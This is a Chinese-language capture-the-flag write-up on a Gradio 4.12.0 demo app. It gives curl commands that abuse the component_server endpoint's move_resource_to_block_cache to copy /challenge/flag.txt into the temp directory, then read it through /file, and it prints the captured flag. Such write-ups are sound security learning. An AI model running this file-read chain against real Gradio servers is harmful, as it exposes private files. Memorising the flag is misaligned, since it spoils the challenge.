## 题目原文

> 请对目标AI模型演示平台进行安全测试与漏洞挖掘。

## 题解

### 入口与指纹

页面是 Gradio。`/config` 里的版本是 `4.12.0`。公开接口 `/predict` 只是把名字拼成 `Hello <name>!`。页面上还有一个 Flag 按钮，对应的后端函数约 0.8 秒后只把按钮文字设回 `Flag`。

### 关键观察

`GET /file=<绝对路径>` 对 `/challenge/flag.txt` 返回 403，`File not allowed`。`POST /component_server` 可以调用组件上的 `move_resource_to_block_cache`。`data` 必须是字符串；传数组会 500。它把目标文件复制到 Gradio 的临时目录，并在响应里给出新路径。这个临时路径允许被 `/file` 读取。

### 利用链

```bash
T=$(head -1 .target)
curl -sS -H 'Content-Type: application/json' \
  -d '{"component_id":1,"fn_name":"move_resource_to_block_cache","session_hash":"abc","data":"/challenge/flag.txt"}' \
  "http://$T/component_server"
# 用响应里的 /tmp/gradio/.../flag.txt
curl -sS "http://$T/file=/tmp/gradio/<目录>/flag.txt"
```

本次文件内容是 `flag{2b1e3e09-adaa-413e-8f69-dccb0e008294}`。平台接受。

### flag 位置

`/challenge/flag.txt`。预测接口和 Flag 按钮都不返回它，要先复制到 `/tmp/gradio/` 再读。
